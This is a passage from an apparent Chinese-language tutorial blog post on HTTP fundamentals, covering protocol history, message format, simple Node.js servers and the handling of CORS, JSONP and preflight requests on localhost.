      <title>HTTP协议原理和实践</title>
      <link href="2020/09/23/http/"/>
      <url>2020/09/23/http/</url>
      
        <content type="html"><![CDATA[<h1>HTTP协议原理和实践</h1><img src="http.png" alt="浏览器输入URL后HTTP请求返回的过程" style="zoom:120%;"><p>​</p><h2 id="1-HTTP协议基础">1. HTTP协议基础</h2><h3 id="1-1-五层模型">1.1 五层模型</h3><p><img src="331769-20181124200628267-282150559.png" alt="TCP/IP五层模型"></p><p><img src="705728-20160424234827195-1493107425.png" alt=""></p><ul><li><p>物理层：主要作用是定义物理设备如何传输数据</p></li><li><p>数据链路层：在通信的实体间建立数据链路连接</p></li><li><p>网络层：为数据在结点之间传输创建逻辑链路</p></li></ul><p>​</p><ul><li>传输层：向用户提供可靠的端到端（End-to-End）服务（传输层向高层屏蔽了下层数据通信的细节）</li><li>应用层：为应用软件提供了服务（屏蔽了网络传输相关细节）</li></ul><p>​</p><p>  HTTP 协议的传输过程就是通过协议栈逐层向下，每一层都添加本层的专有数据，层层打包，然后通过下层发送出去。接收数据是则是相反的操作，从下往上穿过协议栈，逐层拆包，每层去掉本层的专有头，上层就会拿到自己的数据。下层的传输过程对于上层是完全“透明”的，上层也不需要关心下层的具体实现细节。</p><p>​</p><p>​</p><h3 id="1-2-HTTP协议简介">1.2 HTTP协议简介</h3><blockquote><p>HTTP是什么？</p><p>HTTP 是一个在计算机世界里专门在<strong>两点之间</strong>传输文字、图片、音频、视频等超文本数据的约定和规范</p></blockquote><p>​</p><p>  <strong>HTTP</strong>是 <code>Hyper Text Transfer Protocol</code> **（超文本传输协议）**的缩写。它的发展是万维网协会和Internet工作小组IETF合作的结果。它确立了一种计算机之间交流通信的规范，以及相关的各种控制和错误处理方式。</p><p>  <strong>HTTP是一个应用层协议</strong>，由请求和响应构成，是一个标准的客户端服务器模型。</p><p>  因为 <strong>HTTP</strong> 是一个协议，是一种计算机间通信的规范，所以它<strong>不存在“单独的实体”</strong>。它不是应用程序，也不是操作系统，更不是 Web 服务器。但 HTTP 又与应用程序、操作系统、Web 服务器密切相关，在它们之间的通信过程中存在，而且是一种“动态的存在”，是发生在网络连接、传输超文本数据时的一个“动态过程”。</p><p>  在互联网世界里，<strong>HTTP 通常跑在 TCP/IP 协议栈之上</strong>，依靠 <code>IP 协议</code>实现寻址和路由、<code>TCP 协议</code>实现可靠数据传输、<code>DNS协议</code>实现域名查找、<code>SSL/TLS 协议</code>实现安全通信。此外，还有一些协议依赖于它，例如 <code>WebSocket</code>、<code>HTTPDNS</code> 等。这些协议相互交织，构成了一个协议网，而 <strong>HTTP</strong> 处于中心地位。</p><p>​</p><blockquote><p>把这些综合起来，使用递归缩写方式，我们可以把 HTTP 定义为“<strong>与 HTTP 协议相关的所有应用层技术的总和</strong>”</p></blockquote><p>​</p><p>​</p><h3 id="1-3-HTTP协议发展历史">1.3 HTTP协议发展历史</h3><h4 id="史前时期">史前时期</h4><p>  20 世纪 60 年代，美国国防部高等研究计划署建立了 <code>ARPA</code> 网，它有四个分布在各地的节点，被认为是如今互联网的“始祖”。最早的阿帕网还是非常简陋的，<strong>网络控制协议</strong><code>Network Control Protocol</code>**（NCP）**是阿帕网中连接不同计算机的通信协议。</p><p>  <strong>NCP</strong>诞生两年后，开发者温特·瑟夫和罗伯特·卡恩一起开发了一个阿帕网的下一代协议，并在 1974 年发表了以分组、序列化、流量控制、超时和容错等为核心的一种新型的网络互联协议，一举奠定了 <code>TCP/IP</code> 协议的基础。</p><p>  由于具有良好的分层结构和稳定的性能，TCP/IP 协议迅速战胜其他竞争对手流行起来，并在 80 年代中期进入了 <code>UNIX</code> 系统内核，促使更多的计算机接入了互联网。</p><p>​</p><blockquote><p>TCP/IP 的成功不是偶然的，而是综合了几个因素后的结果：</p><ol><li>TCP/IP 是免费或者是少量收费的，这样就扩大了使用人群</li><li>TCP/IP 搭上了 UNIX 这辆时代快车，很快推出了基于套接字（socket）的实际编程接口</li><li>TCP/IP 来源于实际需求，TCP/IP 解决了实际问题，并且在实际中不断完善</li></ol></blockquote><p>​</p><h4 id="创世纪">创世纪</h4><p>  1989 年，任职于欧洲核子研究中心的<code>Tim Berners-Lee</code>发表了一篇论文，提出了在互联网上构建超链接文档系统的构想。这篇论文中他确立了三项关键技术。</p><ol><li><code>URI</code>：<code>Uniform Resource Identifier</code>即统一资源标识符，包括<code>URL</code>和<code>URN</code>，作为互联网上资源的唯一身份</li><li><code>HTML</code>：即超文本标记语言，描述超文本文档</li><li><code>HTTP</code>：即超文本传输协议，用来传输超文本</li></ol><p>  基于它们，就可以把超文本系统完美地运行在互联网上，让各地的人们能够自由地共享信息，蒂姆把这个系统称为<code>World Wide Web</code>，也就是我们现在所熟知的 <code>Web</code></p><p>​</p><h4 id="HTTP-0-9">HTTP/0.9</h4><ul><li><p>只有一个命令GET</p></li><li><p>没有HEADER等描述数据的信息</p></li><li><p>服务器发送完毕，就关闭TCP连接</p></li></ul><p>​</p><p>  20 世纪 90 年代初期的互联网世界非常简陋，计算机处理能力低，存储容量小，网速很慢，还是一片“信息荒漠”。网络上绝大多数的资源都是纯文本，很多通信协议也都使用纯文本，所以 HTTP 的设计也不可避免地受到了时代的限制。</p><p>  这一时期的 HTTP 被定义为 0.9 版，结构简单，为了便于服务器和客户端处理，它也采用了纯文本格式。蒂姆最初设想的系统里的文档都是只读的，所以只允许用<code>GET</code>动作从服务器上获取 HTML 文档，并且在响应请求之后立即关闭连接，功能非常有限。</p><p>  HTTP/0.9 虽然很简单，但作为一个“原型”，充分验证了 Web 服务的可行性。</p><p>​</p><h4 id="HTTP-1-0">HTTP/1.0</h4><ul><li>增加了 HEAD、POST 等命令</li><li>增加了响应状态码 <code>Status code</code>，标记可能的错误原因</li><li>增加了 HTTP Header，让 HTTP 处理请求和响应更加灵活</li><li>引入了协议版本号概念</li><li>传输的数据不再仅限于文本</li></ul><p>​</p><p>  1993 年，美国国家超级计算应用中心开发出了 <strong>Mosaic</strong>，是第一个可以图文混排的浏览器，随后又在 1995 年开发出了服务器软件 <strong>Apache</strong>，简化了 HTTP 服务器的搭建工作。</p><p>  同一时期，计算机多媒体技术也有了新的发展：1992 年发明了 <strong>JPEG</strong> 图像格式，1995 年发明了 <strong>MP3</strong> 音乐格式。</p><p>  这些新软件新技术一经推出立刻就吸引了广大网民的热情，更的多的人开始使用互联网，研究 HTTP 并提出改进意见，甚至实验性地往协议里添加各种特性，从用户需求的角度促进了 HTTP 的发展。</p><p>  在这些已有实践的基础上，经过一系列的草案，HTTP/1.0 版本在 1996 年正式发布。它在多方面增强了 0.9 版，形式上已经和我们现在的 HTTP 差别不大。</p><blockquote><p>但是HTTP/1.0 并不是一个“标准”，只是记录已有实践和模式的一份参考文档，不具有实际的约束力，相当于一个“备忘录”。</p></blockquote><p>​</p><h4 id="HTTP-1-1">HTTP/1.1</h4><ul><li>明确了连接管理，允许持久连接</li><li>增加了 PUT、DELETE 等新命令</li><li>增加了缓存管理和控制</li><li>允许响应数据分块**（chunked）**，利于传输大文件</li><li>增加 Host ，让互联网主机托管成为可能</li></ul><p>​</p><p>  1995 年，网景的 Netscape Navigator 和微软的 Internet Explorer 开始了著名的“浏览器大战”，都希望在互联网上占据主导地位。最终微软的 IE 取得了胜利。不可否认的是，它再一次极大地推动了 Web 的发展，HTTP/1.0 也在这个过程中经受了实践检验。</p><p>  在“浏览器大战”结束之后的 1999 年，<strong>HTTP/1.1 发布了 RFC 文档，编号为 2616</strong>，正式确立了延续十余年的传奇。HTTP/1.1 是对 HTTP/1.0 的小幅度修正。但一个重要的区别是：它是一个“正式的标准”。这意味着今后互联网上所有的浏览器、服务器、网关、代理等等，只要用到 HTTP 协议，就必须严格遵守这个标准。HTTP/1.1 开启了后续的“Web 1.0”“Web 2.0”时代。</p><p>  由于 HTTP/1.1 太过庞大和复杂，所以在 2014 年又做了一次修订，原来的一个大文档被拆分成了六份较小的文档，编号为 7230-7235，优化了一些细节，但此外没有任何实质性的改动。</p><p>​</p><h4 id="HTTP-2">HTTP/2</h4><ul><li><p>所有数据以二进制传输，不再是纯文本</p></li><li><p>头信息压缩以及推送等提高效率的功能</p></li><li><p>可发起多个请求，废弃了 1.1 里的管道</p></li><li><p>增强了安全性</p></li></ul><p>​</p><p>  Google 开发了自己的浏览器 Chrome，然后推出了新的 <code>SPDY 协议</code>，并在 Chrome 里应用于自家的服务器，开启了第二次的“浏览器大战”。这次的胜利者是 Google，Chrome 目前的全球的占有率超过了 60%。Google 借此顺势把 <code>SPDY</code> 推上了标准的宝座，互联网标准化组织以 <code>SPDY</code> 为基础开始制定新版本的 HTTP 协议，最终<strong>在 2015 年发布了 HTTP/2，RFC 编号 7540</strong></p><p>​</p><blockquote><p>HTTP2的优势：</p><ol><li><p>信道复用</p></li><li><p>分帧传输：传输数据不需要连续的发送，可以分成不同的帧进行发送</p></li><li><p>Server Push：使服务端可以主动的向客户端发送内容</p></li></ol></blockquote><p>​</p><h4 id="HTTP-3">HTTP/3</h4><p>  在 HTTP/2 还处于草案之时，Google 又发明了一个新的协议 <code>QUIC</code>，依托其的庞大用户量和数据量，持续地推动 <code>QUIC 协议</code>成为互联网上的“既成事实”。</p><p>  2018 年，互联网标准化组织 IETF 提议将“HTTP over QUIC”更名为“HTTP/3”并获得批准，HTTP/3 正式进入了标准化制订阶段，也许两三年后就会正式发布，到时候我们很可能会跳过 HTTP/2 直接进入 HTTP/3。</p><p>​</p><h4 id="总结-2">总结</h4><ol><li>HTTP 协议始于三十年前蒂姆·伯纳斯 - 李的一篇论文</li><li>HTTP/0.9 是个简单的文本协议，只能获取文本资源</li><li>HTTP/1.0 确立了大部分现在使用的技术，但它不是正式标准</li><li>HTTP/1.1 是目前互联网上使用最广泛的协议，功能也非常完善</li><li>HTTP/2 基于 Google 的 SPDY 协议，注重性能改善，但还未普及</li><li>HTTP/3 基于 Google 的 QUIC 协议，是将来的发展方向</li></ol><p>​</p><p>​</p><h3 id="1-4-HTTP报文格式">1.4 HTTP报文格式</h3><img src="image-20210207223800223.png" alt="HTTP协议格式" style="zoom: 67%;"><p>请求报文</p><ul><li><p>HTTP 协议是以 ASCII 码传输，建立在 TCP/IP 协议之上的应用层规范</p></li><li><p>规范把 HTTP 请求分为三个部分：状态行、请求头、消息主体</p></li></ul><p>HTTP方法：</p><ul><li>用来定义对于资源的操作</li><li>常用的有GET、POST、PUT、DELETE等</li><li>从定义上讲有各自的语义</li></ul><p>HTTP CODE：</p><ul><li><p>定义服务器对请求的处理结果</p></li><li><p>各个区间的CODE有各自的语义</p></li><li><p>好的HTTP服务可以通过CODE判断结果</p></li></ul><p>​</p><p>​</p><p>​</p><h3 id="1-5-一个简单web服务">1.5 一个简单web服务</h3><p>创建一个基于node.js的简单的Web服务，然后在浏览器输出localhost:8000就可以得到返回值了</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8000'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="image-20210122212153947.png" alt="启动web服务" style="zoom: 90%;"><img src="image-20210122212317288.png" alt="成功加载" style="zoom: 80%;"><p>​</p><p>​</p><p>​</p><h2 id="2-HTTP的特性">2. HTTP的特性</h2><h3 id="2-1-HTTP客户端">2.1 HTTP客户端</h3><p>浏览器：<a href="http://xn--baidu-ep5hk31azrbeet66u3pxdtso.com">浏览器地址输入baidu.com</a>，就会返回响应内容。General就是http的首行，它并不属于http报文，它不仅返回内容，还处理了返回内容，如Response</p><img src="331769-20181129064014294-1238237602.png" alt="Google浏览器" style="zoom: 50%;"><img src="浏览器发起 HTTP 请求的典型场景.png" alt="浏览器发起 HTTP 请求的典型场景" style="zoom:60%;"><p>​curl：<a href="http://xn--baidu-bl8j211c1fuhh7b.com">直接请求baidu.com</a>，返回如下，而浏览器会去识别这个标签，<a href="http://xn--www-7j2ej9fsa616ko85bnkzd.baidu.com">然后重定向到www.baidu.com</a></p><img src="image-20210122215211846.png" alt="curl工具"><p><img src="image-20210122220156659.png" alt=""></p><p>​</p><h3 id="2-2-CORS-跨域请求">2.2 CORS 跨域请求</h3><h4 id="2-2-1-同域限制">2.2.1 同域限制</h4><p><code>server1.js</code>：8880端口服务，返回<code>test.html</code>页面</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8880</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8880'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>test.html</code>：向8887端口服务发起一个跨域的请求</p><blockquote><p>  跨域资源共享<strong>CORS</strong> 是一种机制，它使用额外的 HTTP 头来告诉浏览器  让运行在一个 origin （domain）上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求。</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">//XMLHttpRequest和Fetch API遵循同源策略,这意味着使用这些API的Web应用只能从同一个域请求HTTP资源，除非使用CORS头文件</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1:8887/'</span><span class="token punctuation">)</span>  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>server2.js</code>：8887端口服务</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210123164813202.png" alt="跨域请求报错"></p><p>解决方法：在添加<code>server2.js</code>中添加代码如下（浏览器在解析请求返回的内容时发现没有Access-Control-Allow-Origin设置为允许，会将返回内容忽略掉并报错）</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Access-Control-Allow-Origin'</span><span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里就可以指定域名来访问服务器，从而实现安全的跨域请求 ，也可以通过判断request.url来进行不同的跨域请求设置</p><blockquote><p>提示：浏览器会认为localhost与127.0.0.1是跨域</p></blockquote><h4 id="2-2-2-jsonp实现跨域请求">2.2.2 jsonp实现跨域请求</h4><p>直接在<code>test.html</code>中使用srcipt标签来实现跨域，这样就不需要在服务器设置Access-Control-Allow-Origin属性了</p><p>浏览器允许link、img、script标签上面的src或者是ref跨域来实现的</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8887<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-3-CORS预请求">2.2.3 CORS预请求</h4><p>修改<code>test.html</code>文件，刷新页面后再次发生跨域的报错</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://localhost:8887'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    headers<span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token string">'X-Test-Cors'</span><span class="token operator">:</span> <span class="token string">'123'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210123180145542.png" alt=""></p><p>报错原因：</p><p>​跨域资源共享标准（ cross-origin sharing standard ）允许在下列场景中使用跨域 HTTP 请求：</p><ul><li>由 XMLHttpRequest 或 Fetch 发起的跨域 HTTP 请求</li><li>Web 字体 （CSS 中通过<code>@font-face</code>使用跨域字体资源）</li><li>WebGL 贴图</li><li>使用 drawImage 将 Images/video 画面绘制到 canvas</li><li>样式表（使用 CSSOM）</li></ul><p>在发生跨域时的限制：</p><ul><li><p>允许的方法默认只有：<code>GET</code>、<code>HEAD</code>、<code>POST</code>，其他的方法是默认不允许的（其他方法就需要进行预请求）</p></li><li><p>允许<code>Content-Type</code>：<code>text/plain</code>、<code>multipart/form-data</code>、<code>application/x-www-form-urlencoded</code>,其他的也需要预请求</p></li><li><p>其他限制：请求头限制(<a href="https://fetch.spec.whatwg.org/#cors-safelisted-request-header">Fetch</a>)、XMLHttpRequestUpload对象均没有注册任何事件监听器、请求中没有使用ReadableStream对象</p></li></ul><p>解决方法：修改<code>server2.js</code>文件的请求头信息</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Access-Control-Allow-Origin'</span><span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">,</span>    <span class="token string">'Access-Control-Allow-Headers'</span><span class="token operator">:</span> <span class="token string">'X-Test-Cors'</span><span class="token punctuation">,</span>    <span class="token string">'Access-Control-Allow-Methods'</span><span class="token operator">:</span> <span class="token string">'POST, PUT, DELETE'</span><span class="token punctuation">,</span>    <span class="token string">'Access-Control-Max-Age'</span><span class="token operator">:</span> <span class="token string">'1000'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" 